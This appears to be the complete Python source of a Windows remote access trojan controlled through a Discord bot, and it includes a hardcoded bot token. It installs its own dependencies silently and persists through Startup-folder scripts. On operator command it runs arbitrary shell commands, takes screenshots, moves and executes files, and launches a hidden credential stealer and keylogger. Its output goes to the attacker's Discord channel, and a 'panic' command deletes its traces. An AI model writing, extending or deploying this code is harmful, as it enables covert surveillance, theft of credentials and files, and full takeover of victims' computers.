from subprocess import check_call, CREATE_NO_WINDOW, Popen, check_output, run, STDOUT
import tempfile
import getpass
import shutil
import time
import json
import sys
import os

def install_package(package):
    check_call([sys.executable, "-m", "pip", "install", package, '--quiet'])

try:
    import requests
    import discord
    import pyautogui
    from discord.ext import commands
except ImportError as e:
    missing_module = str(e).split()[-1]
    install_package(missing_module)
    globals()[missing_module] = __import__(missing_module)

help_text = {
    "Malware": (
        "- ``steal` - Start the stealer.\n"
        "- ``keylog` - Start the keylogger.\n"
    ),
    "FileManagement": (
        "- `!current_dir` - Displays your current directory.\n"
        "- `!delete_file <file_name>` - Deletes a specified file from the current directory.\n"
        "- `!list_files` - Lists files in the current directory.\n"
        "- `!change_dir <path>` - Changes the current working directory.\n"
        "- `!search_file <keyword>` - Recursively searches for files containing a keyword in the current directory.\n"
        "- `!disk_usage` - Reports disk space usage."
    ),
    "RemoteAccess": (
        "- `!stop_access` - Stops remote access entirely.\n"
        "- `!panic` - Activates panic mode; stops remote access and deletes startup files."
    ),
    "System": (
        "- `!cmd <command>` - Executes a system command.\n"
        "- `!screenshot` - Takes a screenshot and sends it.\n"
        "- `!download <file_name>` - Downloads a file from the current directory.\n"
        "- `!upload` - Uploads a sent file.\n"
        "- `!execute <file_path>` - Executes a specified file.\n"
        "- `!rename <old_name> <new_name>` - Renames a file in the current directory.\n"
        "- `!process_list` - Lists all running processes.\n"
        "- `!schedule_task <task> <time>` - Schedules a task.\n"
        "- `!service <action> <service_name>` - Manage Windows services (start/stop/restart).\n"
        "- `!system_info` - Displays system info (OS, CPU, memory usage)."
    ),
    "Documentation": (
        "- `!help` - Lists all commands and their descriptions."
    )
}

prefix = "!"
stop = False
USER_NAME = getpass.getuser()
token = "MTMxNTQ1OTQ5MjI0NjE5NjI1NA.GxSf77.CUHcny6L1tU_KtuBEVD7uX8E_DUHzkuCjU9ZjA"

stealer_path = f"C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\stealer.pyw"
rat_path = f"C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\rat.pyw"
bat_path = f"C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\open.bat"

intents = discord.Intents.default()
intents.message_content = True
client = commands.Bot(command_prefix=prefix, intents=intents)
client.remove_command("help")

current_directories = {}

@client.event
async def on_ready():
    os.system("cls")
    print(f"Connected to {requests.get('https://api.ipify.org').text.strip()}.")
    await setup_channel()

async def setup_channel():
    global ip_channel_id
    ip = requests.get('https://api.ipify.org').text.strip().replace('.', '_')
    category_id = 1315456449647743016
    guild = discord.utils.get(client.guilds)
    category = guild.get_channel(category_id)
    channel = discord.utils.get(category.channels, name=ip)

    if channel:
        await channel.delete()

    channel = await category.create_text_channel(ip)
    ip_channel_id = channel.id
    await channel.send(f"Remote Access from {ip} launched.")
    await channel.send("Send `!help` to get all the commands.")

async def error_message(ctx, error, command_syntax):
    await ctx.send(f"Error: {str(error)}\nUsage: `{command_syntax}`")

@client.command()
@commands.cooldown(1, 5, commands.BucketType.category)
async def current_dir(ctx):
    current_path = current_directories.get(ctx.channel.id, os.getcwd())
    await ctx.send(f'Your current directory is: `{current_path}`')

@client.command()
@commands.cooldown(1, 5, commands.BucketType.category)
async def stop_access(ctx):
    await ctx.send(f'Stopping access.')
    stop = True
    await ctx.send(f'Stopped access.')

@client.command()
@commands.cooldown(1, 5, commands.BucketType.category)
async def panic(ctx):
    global stop
    await ctx.send("Panic mode activated /!\ Stopping access...")
    
    await ctx.send("The system will close, and the files will be deleted.")

    startup_directory = f"C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    files_to_delete = [
        'stealer.pyw',
        'rat.lnk',
        'stealer.lnk',
        'rat.pyw'
    ]
    
    for file in files_to_delete:
        try:
            os.remove(os.path.join(startup_directory, file))
            await ctx.send(f"Deleted: `{file}`")
        except Exception as e:
            await ctx.send(f"Could not delete `{file}`: {str(e)}")

    await ctx.send("Deleting the channel...")
    await ctx.channel.delete()
    stop = True
    await client.close()


@client.command()
@commands.cooldown(1, 5, commands.BucketType.category)
async def change_dir(ctx, *, path):
    try:
        new_path = os.path.abspath(path)

        if not os.path.exists(new_path):
            await ctx.send(f"Error: The directory `{new_path}` does not exist.")
            return
        
        current_directories[ctx.channel.id] = new_path
        await ctx.send(f"Changed directory to: `{new_path}`")
    except Exception as e:
        await error_message(ctx, e, "!change_directory <path>")

@client.command()
@commands.cooldown(1, 5, commands.BucketType.category)
async def list_files(ctx):
    try:
        directory = current_directories.get(ctx.channel.id, os.getcwd())
        files = os.listdir(directory)
        await ctx.send(f"Files in `{directory}`:\n" + "\n".join([f"`{f}`" for f in files if f not in ['stealer.pyw', 'rat.pyw', 'open.bat']]))
    except Exception as e:
        await error_message(ctx, e, "!list_files")

@client.command()
@commands.cooldown(1, 5, commands.BucketType.category)
async def delete_file(ctx, *, file_name):
    try:
        directory = current_directories.get(ctx.channel.id, os.getcwd())
        file_path = os.path.join(directory, file_name)
        if os.path.isfile(file_path):
            os.remove(file_path)
            await ctx.send(f'Deleted: `{file_path}`')
        else:
            await ctx.send("File not found.")
    except Exception as e:
        await error_message(ctx, e, "!delete_file <file_name>")

@client.command()
@commands.cooldown(1, 5, commands.BucketType.category)
async def rename_file(ctx, old_name, new_name):
    try:
        directory = current_directories.get(ctx.channel.id, os.getcwd())
        old_file_path = os.path.join(directory, old_name)
        new_file_path = os.path.join(directory, new_name)

        if os.path.isfile(old_file_path):
            os.rename(old_file_path, new_file_path)
            await ctx.send(f'Renamed: `{old_file_path}` to `{new_file_path}`')
        else:
            await ctx.send("File not found.")
    except Exception as e:
        await error_message(ctx, e, "!rename <old_name> <new_name>")

@client.command()
async def download_file(ctx, *, file_name):
    try:
        directory = current_directories.get(ctx.channel.id, os.getcwd())
        file_path = os.path.join(directory, file_name)
        if os.path.isfile(file_path):
            await ctx.send(file=discord.File(file_path))
        else:
            await ctx.send("File not found.")
    except Exception as e:
        await error_message(ctx, e, "!download <file_name>")

@client.command()
@commands.cooldown(1, 5, commands.BucketType.category)
async def upload_file(ctx):
    try:
        temp_folder = tempfile.gettempdir()
        if ctx.message.attachments:
            for attachment in ctx.message.attachments:
                await attachment.save(os.path.join(temp_folder, attachment.filename))
                await ctx.send(f'Saved: `{attachment.filename}`')
        else:
            await ctx.send("No attachments found.")
    except Exception as e:
        await error_message(ctx, e, "!upload")

@client.command()
@commands.cooldown(1, 5, commands.BucketType.category)
async def execute_file(ctx, *, file_name):
    try:
        directory = current_directories.get(ctx.channel.id, os.getcwd())
        file_path = os.path.join(directory, file_name)
        Popen(file_path, shell=True)
        await ctx.send(f'Executed: `{file_path}`')
    except Exception as e:
        await error_message(ctx, e, "!execute <file_name>")

@client.command()
async def search_file(ctx, *, keyword):
    try:
        directory = current_directories.get(ctx.channel.id, os.getcwd())
        matches = search_files_recursively(directory, keyword)

        if matches:
            if len(matches) > 2000:
                for match in matches:
                    if len(match) > 1000:
                        await ctx.send(match)
                await ctx.send("...and more results.")
            else:
                await ctx.send("Files matching your keyword:\n" + "\n".join([f"`{match}`" for match in matches]))
        else:
            await ctx.send("No matching files found.")
    except Exception as e:
        await error_message(ctx, e, "!search_file <keyword>")

def search_files_recursively(directory, keyword):
    matches = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if keyword.lower() in file.lower():
                matches.append(os.path.join(root, file))
    return matches

@client.command()
async def disk_usage(ctx):
    try:
        total, used, free = shutil.disk_usage("/")
        await ctx.send(f"**Disk Usage:**\n- Total: `{total // (2**30)} GiB`\n- Used: `{used // (2**30)} GiB`\n- Free: `{free // (2**30)} GiB`")
    except Exception as e:
        await error_message(ctx, e, "!disk_usage")

@client.command()
@commands.cooldown(1, 5, commands.BucketType.category)
async def process_list(ctx):
    try:
        processes = check_output("tasklist", text=True)
        if len(processes) > 1999:
            process_chunks = [processes[i:i + 1999] for i in range(0, len(processes), 1999)]
            for chunk in process_chunks:
                await ctx.send(f"```{chunk}```")
        else:
            await ctx.send(f"```{processes}```")
    except Exception as e:
        await error_message(ctx, e, "!process_list")

@client.command()
@commands.cooldown(1, 5, commands.BucketType.category)
async def service(ctx, action, service_name):
    try:
        if action not in ['start', 'stop', 'restart']:
            await ctx.send("Invalid action. Use start, stop, or restart.")
            return
        run(f"sc {action} {service_name}", shell=True)
        await ctx.send(f"Service '{service_name}' {action}ed.")
    except Exception as e:
        await error_message(ctx, e, "!service <action> <service_name>")

@client.command()
@commands.cooldown(1, 5, commands.BucketType.category)
async def system_info(ctx):
    try:
        cpu_info = check_output("wmic cpu get caption", text=True)
        mem_info = check_output("wmic memorychip get capacity", text=True)
        await ctx.send(f"**CPU:** `{cpu_info.strip()}`\n**Memory:** `{mem_info.strip()}`")
    except Exception as e:
        await error_message(ctx, e, "!system_info")

@client.command()
@commands.cooldown(1, 5, commands.BucketType.category)
async def schedule_task(ctx, task, time):
    try:
        command = f'sh -c "echo {task} | at {time}"'
        run(command, shell=True)
        await ctx.send(f"Task '{task}' scheduled at `{time}`.")
    except Exception as e:
        await error_message(ctx, e, "!schedule_task <task> <time>")

@client.command()
@commands.cooldown(1, 5, commands.BucketType.category)
async def help(ctx, *, category=None):
    try:
        if category:
            if category in help_text:
                await ctx.send(f"**{category} Commands:**\n{help_text[category]}")
            else:
                await ctx.send(f"No help found for category: `{category}`. Please choose from: {', '.join(help_text.keys())}.")
        else:
            full_help = "**Commands:**\n" + "\n\n".join([f"**{cat}**:\n{commands}" for cat, commands in help_text.items()])
            await ctx.send(full_help)
    except Exception as e:
        await error_message(ctx, e, "!help")

@client.command()
@commands.cooldown(1, 5, commands.BucketType.category)
async def steal(ctx):
    try:
        pyw_file_path = f"C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\stealer.pyw"
        Popen(['pythonw.exe', pyw_file_path], creationflags=CREATE_NO_WINDOW)
        await ctx.send("Stealed info should be send in a bit.")
    except Exception as e:
        await error_message(ctx, e, "!steal")

@client.command()
@commands.cooldown(1, 5, commands.BucketType.category)
async def keylog(ctx):
    try:
        pyw_file_path = f"C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.pyw"
        Popen(['pythonw.exe', pyw_file_path], creationflags=CREATE_NO_WINDOW)
        await ctx.send("Keylogger should be starting in a bit.")
    except Exception as e:
        await error_message(ctx, e, "!steal")
    

@client.command()
@commands.cooldown(1, 5, commands.BucketType.category)
async def screenshot(ctx):
    try:
        temp_folder = tempfile.gettempdir()
        screenshot = pyautogui.screenshot()
        screenshot_path = os.path.join(temp_folder, "screenshot.png")
        screenshot.save(screenshot_path)
        await ctx.send(file=discord.File(screenshot_path))
        time.sleep(3)
        os.remove(screenshot_path)
    except Exception as e:
        await error_message(ctx, e, "!screenshot")

@client.command()
@commands.cooldown(1, 5, commands.BucketType.category)
async def cmd(ctx, *, command):
    try:
        output = check_output(command, shell=True, stderr=STDOUT, text=True, cwd=os.getcwd())
        await ctx.send(f'Output:\n```\n{output}\n```')
    except Exception as e:
        await error_message(ctx, e, "!cmd <command>")

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send("**Try after {0} seconds.**".format(round(error.retry_after, 2)))

if not stop:
    client.run(token)
else:
    exit()
